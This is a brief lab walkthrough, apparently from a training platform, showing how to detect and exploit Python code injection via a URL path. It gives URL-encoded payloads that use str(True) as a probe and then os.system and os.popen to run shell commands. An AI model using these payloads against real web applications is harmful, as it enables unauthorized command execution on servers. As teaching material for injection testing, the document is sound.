*************** PYTHON ***************

1.To check if it's a Python application, we can for example use (adding to URL):
- "%2bstr(True)%2b"test. [e.g.: http://yourwebsite/hello/"%2bstr(True)%2b"test) ]

The fact that both str() and True are available give us a pretty good chance that Python is used. For the rest of the challenge we will put our payload inside of the call to str().

2. Now, to get to code execution, we can try to use os.system('id') for example:

- http://ptl-0965dda5-eea846ab.libcurl.so/hello/%22%2bstr(os.system('id'))%2b%22

If the return is "0", we know that the command got executed successfully. (if now, you will get 32512 which means that command doesn't exist).

3. It may also be valuable to get the value returned by the command. To do this, you can use os.popen:

http://yourwebsite.com/hello/%22%2bstr(os.popen('/usr/local/bin/').read())%2b%22
